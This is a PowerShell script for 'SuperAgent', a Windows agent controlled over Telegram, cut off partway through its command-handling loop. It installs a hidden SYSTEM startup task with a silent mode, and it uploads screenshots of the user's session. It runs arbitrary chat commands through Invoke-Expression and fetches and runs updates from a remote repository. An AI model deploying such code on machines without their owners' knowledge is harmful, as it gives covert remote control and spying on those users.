# =====================================================================
# SuperAgent - Telegram-controlled Windows agent (single-file)
# Version: 2.2.5
# =====================================================================
# CHANGELOG 2.2.5:
# - Replaced curl.exe in Send-TelegramPhoto with System.Net.Http.HttpClient.
#   curl.exe was hanging for 60 seconds (timeout) on Windows 11 and
#   silently dropping the upload.
# - Added fallback to sendDocument if sendPhoto fails (e.g. image
#   dimensions too large for Telegram's photo API).
# - Added Write-Log to capture exact Telegram API responses.
# =====================================================================
[CmdletBinding()]
param(
    [switch]$Install,
    [switch]$Uninstall,
    [switch]$Run,
    [switch]$Silent,

    [string]$BotToken,
    [string]$ChatId,
    [string]$PCName
)

$RepoUrl = 'https://raw.githubusercontent.com/minhcuder/remote-control-win11/main'

try {
    [Net.ServicePointManager]::SecurityProtocol =
        [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
} catch {
    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { }
}

$InstallDir   = 'C:\ProgramData\SuperAgent'
$ConfigPath   = Join-Path $InstallDir 'config.json'
$OffsetPath   = Join-Path $InstallDir 'offset.txt'
$ScriptPath   = Join-Path $InstallDir 'pcagent.ps1'
$LogPath      = Join-Path $InstallDir 'agent.log'
$TaskName     = 'SuperAgent'

if ($Silent) {
    $ErrorActionPreference = 'SilentlyContinue'
    $null = New-Item -Path 'Alias:' -Name 'Write-Host' -Value 'Out-Null' -Force -ErrorAction SilentlyContinue
} else {
    $ErrorActionPreference = 'Stop'
}

function Write-Msg {
    param([string]$Message, [string]$Color = 'White')
    if (-not $Silent) { Write-Host $Message -ForegroundColor $Color }
}

# =====================================================================
# AUTO-ELEVATE
# =====================================================================
function Test-IsAdmin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    return ([Security.Principal.WindowsPrincipal] $id).IsInRole(
           [Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Invoke-SelfElevation {
    param($ScriptParams)

    $scriptFile = $PSCommandPath
    if (-not $scriptFile -or -not (Test-Path $scriptFile)) {
        try {
            $scriptFile = Join-Path $env:TEMP "pcagent_elev_$(Get-Random).ps1"
            Write-Msg "[*] Downloading script to temp for elevation: $scriptFile" -Color Yellow
            Invoke-WebRequest -Uri "$RepoUrl/pcagent.ps1" -OutFile $scriptFile -TimeoutSec 30 -UseBasicParsing
        } catch {
            Write-Msg "[-] Failed to download script for elevation: $($_.Exception.Message)" -Color Red
            if (-not $Silent) { try { Read-Host 'Press Enter to exit' | Out-Null } catch { } }
            exit 1
        }
    }

    $argString = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptFile`""
    if ($ScriptParams) {
        foreach ($key in $ScriptParams.Keys) {
            $val = $ScriptParams[$key]
            if ($val -is [System.Management.Automation.SwitchParameter]) {
                if ($val.IsPresent) { $argString += " -$key" }
            } elseif ($null -ne $val) {
                $escaped = ([string]$val) -replace "'", "''"
                $argString += " -$key '$escaped'"
            }
        }
    }

    Write-Msg ''
    Write-Msg '[*] Requesting Admin Permission (UAC)...' -Color Yellow
    Write-Msg '    Please click Yes on the UAC dialog.' -Color Yellow
    Write-Msg ''

    try {
        $p = Start-Process -FilePath 'powershell.exe' `
                            -ArgumentList $argString `
                            -Verb RunAs `
                            -WindowStyle Hidden `
                            -PassThru `
                            -Wait
        if ($scriptFile -like "$env:TEMP\pcagent_elev_*") {
            Remove-Item $scriptFile -Force -ErrorAction SilentlyContinue
        }
        exit $p.ExitCode
    } catch {
        Write-Msg ''
        Write-Msg '[-] UAC denied or elevation failed.' -Color Red
        Write-Msg "    $($_.Exception.Message)" -Color Red
        if (-not $Silent) { try { Read-Host 'Press Enter to exit' | Out-Null } catch { } }
        exit 1
    }
}

if (($Install -or $Uninstall) -and -not (Test-IsAdmin)) {
    Invoke-SelfElevation -ScriptParams $PSBoundParameters
}

# =====================================================================
# INSTALL BLOCK
# =====================================================================
$InstallBlock = {
    $ErrorActionPreference = 'Stop'

    if (-not $BotToken -and -not $Silent) { $BotToken = Read-Host 'Bot Token' }
    if (-not $ChatId   -and -not $Silent) { $ChatId   = Read-Host 'Chat ID' }
    if (-not $PCName   -and -not $Silent) { $PCName   = Read-Host 'PC Name' }

    if ($RepoUrl -match 'USERNAME/REPO') { throw '!!! $RepoUrl NOT UPDATED !!!' }

    Write-Msg ''
    Write-Msg '=== SuperAgent Installer (v2.2.5) ===' -Color Cyan
    Write-Msg "  PC Name  : $PCName"
    Write-Msg "  Chat ID  : $ChatId"
    Write-Msg "  Repo URL : $RepoUrl"
    Write-Msg ''

    if (-not (Test-Path $InstallDir)) {
        New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
    }

    $existingTask   = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    $legacyTask     = Get-ScheduledTask -TaskName 'PCAgent' -ErrorAction SilentlyContinue
    $existingConfig = Test-Path $ConfigPath
    if ($existingTask -or $existingConfig -or $legacyTask) {
        Write-Msg '[*] Existing installation detected. Cleaning up...' -Color Yellow

        if ($existingTask) {
            try {
                Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
                Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
            } catch { }
        }
        if ($legacyTask) {
            try {
                Stop-ScheduledTask -TaskName 'PCAgent' -ErrorAction SilentlyContinue
                Unregister-ScheduledTask -TaskName 'PCAgent' -Confirm:$false -ErrorAction SilentlyContinue
            } catch { }
        }

        Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
            Where-Object { $_.CommandLine -and ($_.CommandLine -like '*pcagent.ps1*') } |
            ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch { } }
        Start-Sleep -Seconds 2

        if ($existingConfig) {
            try {
                $oldCfg = Get-Content $ConfigPath -Raw -Encoding UTF8 | ConvertFrom-Json
                if (-not $BotToken -and $oldCfg.BotToken) { $BotToken = $oldCfg.BotToken }
                if (-not $ChatId   -and $oldCfg.ChatId)   { $ChatId   = [string]$oldCfg.ChatId }
                if (-not $PCName   -and $oldCfg.PCName)   { $PCName   = $oldCfg.PCName }
            } catch { }
        }

        Get-ChildItem -Path $InstallDir -Force -ErrorAction SilentlyContinue |
            Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    }

    if ($PCName -notmatch '^[A-Za-z][A-Za-z0-9_\-]{1,31}$') {
        throw "Invalid PCName: '$PCName'."
    }
    if (-not $BotToken) { throw 'Bot Token is required.' }

    if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
        Copy-Item $PSCommandPath $ScriptPath -Force
    } else {
        Invoke-WebRequest -Uri "$RepoUrl/pcagent.ps1" -OutFile $ScriptPath -TimeoutSec 30 -UseBasicParsing
    }

    $Config = [ordered]@{
        BotToken    = $BotToken
        ChatId      = $ChatId
        PCName      = $PCName
        RepoUrl     = $RepoUrl.TrimEnd('/')
        Version     = '2.2.5'
        InstalledAt = (Get-Date -Format 'o')
    }
    $Config | ConvertTo-Json | Out-File $ConfigPath -Encoding UTF8

    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
        try {
            Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
            Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
        } catch { }
    }

    $action    = New-ScheduledTaskAction -Execute 'powershell.exe' `
                 -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$ScriptPath`" -Run"
    $trigger   = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
    $settings  = New-ScheduledTaskSettingsSet `
                    -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
                    -StartWhenAvailable `
                    -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) `
                    -ExecutionTimeLimit ([TimeSpan]::Zero) -DontStopOnIdleEnd

    Register-ScheduledTask -TaskName $TaskName `
        -Action $action -Trigger $trigger `
        -Principal $principal -Settings $settings `
        -Description 'SuperAgent - Telegram remote control agent' | Out-Null

    Start-ScheduledTask -TaskName $TaskName

    Write-Msg ''
    Write-Msg '[+] INSTALLATION COMPLETE (v2.2.5)' -Color Green
    Write-Msg "    Log: $LogPath" -Color Green
    Write-Msg ''
    if (-not $Silent) { Pause-Exit }
}

# =====================================================================
# UNINSTALL BLOCK
# =====================================================================
$UninstallBlock = {
    $ErrorActionPreference = 'Continue'
    Write-Msg '[*] Uninstalling SuperAgent...' -Color Cyan

    try {
        Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    } catch { }

    if (Get-ScheduledTask -TaskName 'PCAgent' -ErrorAction SilentlyContinue) {
        try {
            Stop-ScheduledTask -TaskName 'PCAgent' -ErrorAction SilentlyContinue
            Unregister-ScheduledTask -TaskName 'PCAgent' -Confirm:$false -ErrorAction SilentlyContinue
        } catch { }
    }

    Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
        Where-Object { $_.CommandLine -and ($_.CommandLine -like '*pcagent.ps1*') } |
        ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch { } }

    if (Test-Path $InstallDir) {
        Remove-Item -Recurse -Force $InstallDir -ErrorAction SilentlyContinue
    }

    Write-Msg ''
    Write-Msg '[+] UNINSTALL COMPLETE.' -Color Green
    if (-not $Silent) { Pause-Exit }
}

# =====================================================================
# AGENT BLOCK
# =====================================================================
$AgentBlock = {
    if (-not (Test-Path $ConfigPath)) { exit 1 }
    try {
        $Config = Get-Content $ConfigPath -Raw -Encoding UTF8 | ConvertFrom-Json
    } catch { exit 1 }

    $script:BotToken = $Config.BotToken
    $script:ChatId   = [string]$Config.ChatId
    $script:PCName   = $Config.PCName
    $script:RepoUrl  = $Config.RepoUrl
    $script:Version  = if ($Config.Version) { $Config.Version } else { 'unknown' }

    if (-not $BotToken -or -not $ChatId -or -not $PCName) { exit 1 }

    $script:Offset = 0
    if (Test-Path $OffsetPath) {
        try { $script:Offset = [int](Get-Content $OffsetPath -First 1) } catch { $script:Offset = 0 }
    }

    function Write-Log {
        param([string]$Message)
        try {
            $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
            $line | Out-File $LogPath -Append -Encoding UTF8
            if ((Get-Item $LogPath -ErrorAction SilentlyContinue).Length -gt 2MB) {
                $bak = "$LogPath.1"
                if (Test-Path $bak) { Remove-Item $bak -Force }
                Rename-Item $LogPath $bak -Force
            }
        } catch { }
    }

    Write-Log "=== Agent started (v$Version, PCName=$PCName, ChatId=$ChatId) ==="

    # =================================================================
    # P/INVOKE: CreateProcessAsUser in the user's interactive session
    # =================================================================
    try {
        Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class SuperAgentUserSession
{
    [DllImport("kernel32.dll", SetLastError = true)] static extern bool CloseHandle(IntPtr hObject);
    [DllImport("wtsapi32.dll", SetLastError = true)] static extern bool WTSQueryUserToken(UInt32 sessionId, out IntPtr phToken);
    [DllImport("advapi32.dll", SetLastError = true)] static extern bool DuplicateTokenEx(
        IntPtr hExistingToken, UInt32 dwDesiredAccess, IntPtr lpTokenAttributes,
        int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
    [DllImport("userenv.dll", SetLastError = true)] static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);
    [DllImport("userenv.dll", SetLastError = true)] static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment);
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO {
        public int cb; public string lpReserved, lpDesktop, lpTitle;
        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
    const uint MAXIMUM_ALLOWED            = 0x02000000;
    const int  SecurityImpersonation      = 2;
    const int  TokenPrimary               = 1;
    public static string Start(uint sessionId, string commandLine) {
        IntPtr userToken = IntPtr.Zero;
        if (!WTSQueryUserToken(sessionId, out userToken))
            return "ERR WTSQueryUserToken Win32=" + Marshal.GetLastWin32Error();
        try {
            IntPtr primaryToken = IntPtr.Zero;
            if (!DuplicateTokenEx(userToken, MAXIMUM_ALLOWED, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out primaryToken))
                return "ERR DuplicateTokenEx Win32=" + Marshal.GetLastWin32Error();
            try {
                IntPtr env = IntPtr.Zero;
                CreateEnvironmentBlock(out env, primaryToken, false);
                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
                si.lpDesktop = "winsta0\\default";
                PROCESS_INFORMATION pi;
                bool ok = CreateProcessAsUserW(primaryToken, null, commandLine,
                    IntPtr.Zero, IntPtr.Zero, false, CREATE_UNICODE_ENVIRONMENT, env, null, ref si, out pi);
                int err = Marshal.GetLastWin32Error();
                if (env != IntPtr.Zero) DestroyEnvironmentBlock(env);
                if (!ok) return "ERR CreateProcessAsUser Win32=" + err;
                return "OK pid=" + pi.dwProcessId;
            } finally { if (primaryToken != IntPtr.Zero) CloseHandle(primaryToken); }
        } finally { if (userToken != IntPtr.Zero) CloseHandle(userToken); }
    }
}
'@ -ErrorAction Stop
        Write-Log "SuperAgentUserSession C# class loaded OK"
    } catch {
        Write-Log "FATAL: Add-Type failed: $($_.Exception.Message)"
    }

    function Send-Telegram {
        param([string]$Text)
        if ([string]::IsNullOrWhiteSpace($Text)) { return }
        $body = @{ chat_id = $ChatId; text = $Text; parse_mode = 'Markdown' }
        try {
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
                -Method Post -Body $body -TimeoutSec 15 | Out-Null
            Write-Log "Telegram sendMessage OK (len=$($Text.Length))"
            return $true
        } catch {
            Write-Log "Telegram sendMessage FAIL: $($_.Exception.Message)"
            return $false
        }
    }

    # =================================================================
    # FIXED v2.2.5: Send-TelegramPhoto using HttpClient (no curl.exe)
    # =================================================================
    function Send-TelegramPhoto {
        param([string]$FilePath, [string]$Caption = '')
        if (-not (Test-Path $FilePath)) {
            Send-Telegram "[$PCName] Image file not found: $FilePath"
            return
        }

        try {
            Add-Type -AssemblyName System.Net.Http -ErrorAction Stop
            $url = "https://api.telegram.org/bot$BotToken/sendPhoto"
            $client = New-Object System.Net.Http.HttpClient
            $client.Timeout = [TimeSpan]::FromSeconds(60)
            
            $form = New-Object System.Net.Http.MultipartFormDataContent
            $form.Add((New-Object System.Net.Http.StringContent($ChatId)), 'chat_id')
            if ($Caption) {
                $form.Add((New-Object System.Net.Http.StringContent($Caption)), 'caption')
            }
            
            $fileStream = [System.IO.File]::OpenRead($FilePath)
            $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
            $form.Add($fileContent, 'photo', (Split-Path $FilePath -Leaf))
            
            $response = $client.PostAsync($url, $form).Result
            $responseString = $response.Content.ReadAsStringAsync().Result
            
            Write-Log "sendPhoto status: $($response.StatusCode) | body: $responseString"
            
            if (-not $response.IsSuccessStatusCode) {
                Write-Log "sendPhoto failed, trying sendDocument..."
                $urlDoc = "https://api.telegram.org/bot$BotToken/sendDocument"
                $formDoc = New-Object System.Net.Http.MultipartFormDataContent
                $formDoc.Add((New-Object System.Net.Http.StringContent($ChatId)), 'chat_id')
                if ($Caption) {
                    $formDoc.Add((New-Object System.Net.Http.StringContent($Caption)), 'caption')
                }
                $fileStream.Position = 0
                $fileContentDoc = New-Object System.Net.Http.StreamContent($fileStream)
                $formDoc.Add($fileContentDoc, 'document', (Split-Path $FilePath -Leaf))
                
                $responseDoc = $client.PostAsync($urlDoc, $formDoc).Result
                $responseDocString = $responseDoc.Content.ReadAsStringAsync().Result
                Write-Log "sendDocument status: $($responseDoc.StatusCode) | body: $responseDocString"
                
                if (-not $responseDoc.IsSuccessStatusCode) {
                    Send-Telegram "[$PCName] Failed to send file. Status: $($responseDoc.StatusCode)"
                }
            }
        } catch {
            Write-Log "Send-TelegramPhoto EXCEPTION: $($_.Exception.Message)"
            Send-Telegram "[$PCName] Failed to send image (exception): $($_.Exception.Message)"
        } finally {
            if ($fileStream) { $fileStream.Dispose() }
            if ($client) { $client.Dispose() }
        }
    }

    function Wait-Network {
        $maxAttempts = 0
        Write-Log "Wait-Network: waiting..."
        while ($true) {
            try {
                $null = Invoke-RestMethod -Uri 'https://api.telegram.org' -TimeoutSec 5
                Write-Log "Wait-Network: OK"
                return $true
            } catch {
                Start-Sleep -Seconds 3
                $maxAttempts++
                if ($maxAttempts -gt 600) { return $false }
            }
        }
    }

    function Get-PCInfo {
        try {
            $os  = Get-CimInstance Win32_OperatingSystem
            $cs  = Get-CimInstance Win32_ComputerSystem
            $cpu = Get-CimInstance Win32_Processor | Select-Object -First 1
            $boot = $os.LastBootUpTime
            $up = (Get-Date) - $boot
            $totalRAM = [math]::Round($cs.TotalPhysicalMemory / 1GB, 1)
            $freeRAM  = [math]::Round($os.FreePhysicalMemory / 1MB, 1)
            $ramPct   = if ($totalRAM -gt 0) { [math]::Round(($totalRAM - $freeRAM) / $totalRAM * 100, 0) } else { 0 }
            $localIP = 'N/A'
            try {
                $nic = Get-NetIPConfiguration -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                       Where-Object { $_.IPv4DefaultGateway } | Select-Object -First 1
                if ($nic) { $localIP = $nic.IPv4Address.IPAddress }
            } catch { }
            $externIP = 'N/A'
            try { $externIP = (Invoke-RestMethod 'https://api.ipify.org' -TimeoutSec 5) } catch { }
            $cpuName = if ($cpu) { $cpu.Name } else { 'N/A' }
            return @"
*$PCName* - PC is online (agent v$Version)
|- Computer name: $($cs.Name)
|- Local IP: $localIP
|- External IP: $externIP
|- OS: $($os.Caption) ($($os.Version))
|- CPU: $cpuName
|- RAM: ${totalRAM}GB (used ${ramPct}%)
|- Uptime: $($up.Days)d $($up.Hours)h $($up.Minutes)m
|- Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
"@
        } catch {
            return "[$PCName] Failed to get PC info: $($_.Exception.Message)"
        }
    }

    function Get-InteractiveSession {
        try {
            $explorer = Get-Process -Name explorer -IncludeUserName -ErrorAction SilentlyContinue |
                        Where-Object { $_.UserName -and $_.SessionId -gt 0 } |
                        Sort-Object SessionId | Select-Object -First 1
            if ($explorer) {
                return [PSCustomObject]@{ UserName = $explorer.UserName; SessionId = [uint32]$explorer.SessionId }
            }
        } catch { }
        return $null
    }

    function Start-UserPowerShellScript {
        param([string]$ScriptPath, [string[]]$Arguments = @())

        $session = Get-InteractiveSession
        if (-not $session) { Write-Log "Start-UserPowerShellScript: no interactive session"; return "ERR: no session" }
        if (-not (Test-Path $ScriptPath)) { Write-Log "Start-UserPowerShellScript: script not found: $ScriptPath"; return "ERR: no script" }

        $cmdLine = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $ScriptPath + '"'
        foreach ($a in $Arguments) {
            if ($a -match '[\s"]') { $cmdLine += ' "' + ($a -replace '"', '\"') + '"' }
            else { $cmdLine += ' ' + $a }
        }

        $result = [SuperAgentUserSession]::Start($session.SessionId, $cmdLine)
        Write-Log "Start-UserPowerShellScript: user=$($session.UserName) session=$($session.SessionId) result=$result"
        if ($result -like 'OK*') { return "OK" }
        return $result
    }

    function Invoke-Screenshot {
        $outFile   = Join-Path $env:windir "Temp\shot_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$(Get-Random).png"
        $tmpScript = Join-Path $env:windir "Temp\_shot_$(Get-Random).ps1"
        $errFile   = "$tmpScript.err"

        Remove-Item $errFile -Force -EA SilentlyContinue

        $scriptContent = @"
param([string]`$OutPath)
try {
    Add-Type -AssemblyName System.Drawing
    `$sig = @'
[DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
[DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);
'@
    `$native = Add-Type -MemberDefinition `$sig -Name ScreenMetrics -Namespace SuperAgentNative -PassThru
    `$null = `$native::SetProcessDPIAware()

    `$x = `$native::GetSystemMetrics(76)
    `$y = `$native::GetSystemMetrics(77)
    `$w = `$native::GetSystemMetrics(78)
    `$h = `$native::GetSystemMetrics(79)

    if (`$w -le 0 -or `$h -le 0) { throw "Invalid screen bounds: `${w}x`${h} at (`${x},`${y})" }

    `$bmp = New-Object System.Drawing.Bitmap `$w, `$h
    `$g   = [System.Drawing.Graphics]::FromImage(`$bmp)
    `$g.CopyFromScreen(`$x, `$y, 0, 0, (New-Object System.Drawing.Size(`$w, `$h)))
    `$bmp.Save(`$OutPath, [System.Drawing.Imaging.ImageFormat]::Png)
    `$g.Dispose()
    `$bmp.Dispose()
} catch {
    `$base = `$_.Exception.GetBaseException()
    `$detail = "Exception: `$(`$base.GetType().FullName)`nMessage: `$(`$base.Message)`nInnerException: `$(`$_.Exception.InnerException)`nStackTrace:`n`$(`$base.StackTrace)`nScriptStackTrace:`n`$(`$_.ScriptStackTrace)"
    `$detail | Out-File '$errFile' -Encoding UTF8 -Append
    throw
}
"@
        $scriptContent | Out-File $tmpScript -Encoding UTF8 -Force

        try {
            $acl = Get-Acl $tmpScript
            $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
                'Users', 'ReadAndExecute', 'Allow')))
            Set-Acl $tmpScript $acl
        } catch { }

        Write-Log "Screenshot: launching for $outFile"
        $r = Start-UserPowerShellScript -ScriptPath $tmpScript -Arguments @($outFile)
        if ($r -ne 'OK') {
            Write-Log "Screenshot: launch failed: $r"
            Remove-Item $tmpScript -Force -EA SilentlyContinue
            return $null
        }

        for ($i = 0; $i -lt 50; $i++) {
            if (Test-Path $outFile) { break }
            Start-Sleep -Milliseconds 300
        }

        if (Test-Path $outFile) {
            $sz = (Get-Item $outFile).Length
            Write-Log "Screenshot OK: $outFile ($sz bytes)"
            Remove-Item $tmpScript, $errFile -Force -EA SilentlyContinue
            return $outFile
        }

        if (Test-Path $errFile) {
            Write-Log "Screenshot: user-session script errored:"
            Get-Content $errFile -EA SilentlyContinue | ForEach-Object { Write-Log "  $_" }
        } else {
            Write-Log "Screenshot: no file after 15s (script may not have run)"
        }
        Remove-Item $tmpScript, $errFile -Force -EA SilentlyContinue
        return $null
    }

    function Invoke-Lock {
        $tmpScript = Join-Path $env:windir "Temp\_lock_$(Get-Random).ps1"
        'rundll32.exe user32.dll,LockWorkStation' | Out-File $tmpScript -Encoding UTF8 -Force
        try {
            $acl = Get-Acl $tmpScript
            $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
                'Users', 'ReadAndExecute', 'Allow')))
            Set-Acl $tmpScript $acl
        } catch { }
        $r = Start-UserPowerShellScript -ScriptPath $tmpScript
        Start-Sleep -Seconds 2
        Remove-Item $tmpScript -Force -EA SilentlyContinue
        return ($r -eq 'OK')
    }

    function Invoke-Msg {
        param([string]$Text)
        $safe       = $Text -replace "'", "''"
        $tmpScript  = Join-Path $env:windir "Temp\_msg_$(Get-Random).ps1"
        $statusFile = "$tmpScript.status"

        @"
try {
    Add-Type -AssemblyName System.Windows.Forms
    'START' | Out-File '$statusFile' -Encoding UTF8 -Force
    [System.Windows.Forms.MessageBox]::Show('$safe', 'SuperAgent Message', 'OK', 'Information') | Out-Null
    'DONE'  | Out-File '$statusFile' -Encoding UTF8 -Force
} catch {
    ("ERR: " + `$_.Exception.Message) | Out-File '$statusFile' -Encoding UTF8 -Force
}
"@ | Out-File $tmpScript -Encoding UTF8 -Force

        try {
            $acl = Get-Acl $tmpScript
            $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
                'Users', 'ReadAndExecute', 'Allow')))
            Set-Acl $tmpScript $acl
        } catch { }

        Remove-Item $statusFile -Force -EA SilentlyContinue
        $r = Start-UserPowerShellScript -ScriptPath $tmpScript
        if ($r -ne 'OK') {
            Write-Log "Invoke-Msg: launch failed: $r"
            Remove-Item $tmpScript, $statusFile -Force -EA SilentlyContinue
            return $false
        }

        for ($i = 0; $i -lt 13; $i++) {
            if (Test-Path $statusFile) {
                $s = (Get-Content $statusFile -Raw -EA SilentlyContinue).Trim()
                Write-Log "Invoke-Msg: status=$s"
                Remove-Item $statusFile, $tmpScript -Force -EA SilentlyContinue
                if ($s -like 'ERR:*') { return $false }
                return $true
            }
            Start-Sleep -Milliseconds 300
        }
        Write-Log "Invoke-Msg: no status file after 4s"
        Remove-Item $statusFile, $tmpScript -Force -EA SilentlyContinue
        return $false
    }

    function Invoke-Exec {
        param([string]$Command)
        if (-not $Command) { return 'No command provided.' }
        try {
            $result = Invoke-Expression $Command 2>&1 | Out-String
            if (-not $result) { $result = '(no output)' }
            if ($result.Length -gt 3900) { $result = $result.Substring(0, 3900) + "`n...[truncated]" }
            return $result
        } catch {
            return "Error: $($_.Exception.Message)"
        }
    }

    function Invoke-Update {
        $bust     = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
        $newUrl   = "$RepoUrl/pcagent.ps1?t=$bust"
        $tempFile = Join-Path $InstallDir 'pcagent.ps1.new'
        try {
            Invoke-WebRequest -Uri $newUrl -OutFile $tempFile -TimeoutSec 30 -UseBasicParsing
            $size = (Get-Item $tempFile).Length
            if ($size -lt 1000) { throw "New file too small ($size bytes)" }
            $newContent = Get-Content $tempFile -Raw -Encoding UTF8
            $newVer = if ($newContent -match '# Version:\s*([\d\.\w\-]+)') { $Matches[1] } else { 'unknown' }
            Send-Telegram "[$PCName] Update: got v$newVer ($size bytes). Restarting..."
            Write-Log "Update: downloaded $size bytes, version=$newVer"
            Move-Item $tempFile $ScriptPath -Force
            $restartCmd = "Start-Sleep -Seconds 3; try { Stop-ScheduledTask -TaskName '$TaskName' -EA SilentlyContinue } catch {}; Start-Sleep 2; try { Start-ScheduledTask -TaskName '$TaskName' } catch {}"
            Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$restartCmd`"" -WindowStyle Hidden | Out-Null
            Write-Log "Update done. Exiting."
            exit 0
        } catch {
            Send-Telegram "[$PCName] Update failed: $($_.Exception.Message)"
            if (Test-Path $tempFile) { Remove-Item $tempFile -Force -EA SilentlyContinue }
        }
    }

    $script:UninstallPendingAt = $null
    function Test-UninstallConfirmation {
        if ($script:UninstallPendingAt) {
            if (((Get-Date) - $script:UninstallPendingAt).TotalSeconds -le 10) { return $true }
        }
        return $false
    }

    function Invoke-SelfUninstall {
        Write-Log "Self-uninstall triggered"
        $uninstallCmd = @"
Start-Sleep -Seconds 3
try {
    Stop-ScheduledTask -TaskName '$TaskName' -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName '$TaskName' -Confirm:`$false -ErrorAction SilentlyContinue
} catch {}
Start-Sleep -Seconds 1
Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { `$_.CommandLine -like '*pcagent.ps1*' } |
    ForEach-Object { try { Stop-Process -Id `$_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }
Start-Sleep -Seconds 1
if (Test-Path '$InstallDir') { Remove-Item -Recurse -Force '$InstallDir' -ErrorAction SilentlyContinue }
"@
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$uninstallCmd`"" -WindowStyle Hidden | Out-Null
    }

    Wait-Network
    $bootMsg = Get-PCInfo
    $bootOk = Send-Telegram $bootMsg
    if (-not $bootOk) { Write-Log "Boot notification FAIL" }

    while ($true) {
        try {
            $url = "https://api.telegram.org/bot$BotToken/getUpdates?offset=$Offset&timeout=30"
            $response = Invoke-RestMethod -Uri $url -TimeoutSec 35

            if ($response.result) {
                foreach ($update in $response.result) {
                    $script:Offset = [int]$update.update_id + 1
                    try { $Offset | Out-File $OffsetPath -Encoding ASCII -ErrorAction SilentlyContinue } catch { }

                    if (-not $update.message) { continue }
                    if (-not $update.message.text) { continue }

                    $fromChatId = [string]$update.message.chat.id
                    if ($fromChatId -ne $ChatId) {
                        Write-Log "REJECT message from chat_id=$fromChatId"
                        continue
                    }

                    $text = $update.message.text.Trim()
                    if (-not $text.StartsWith('/')) { continue }

                    Write-Log "RECV command: $text"

                    $parts = $text -split '\s+'
                    $cmd   = $parts[0].ToLower()
                    $pcname = $null
                    $restArgs = @()

                    if ($parts.Length -le 1) { }
                    elseif ($parts[1].StartsWith('@')) {
                        $pcname = $parts[1].Substring(1)
                        if ($parts.Length -gt 2) { $restArgs = $parts[2..($parts.Length - 1)] }
                    } else {
                        $arg1 = $parts[1]
                        if (($arg1 -match '^[A-Za-z][A-Za-z0-9_\-]{0,31}$') -and ($cmd -notin @('/exec', '/msg'))) {
                            $pcname = $arg1
                            if ($parts.Length -gt 2) { $restArgs = $parts[2..($parts.Length - 1)] }
                        } else {
                            $restArgs = $parts[1..($parts.Length - 1)]
                        }
                    }

                    if ($pcname -and $pcname -ne $PCName) { continue }
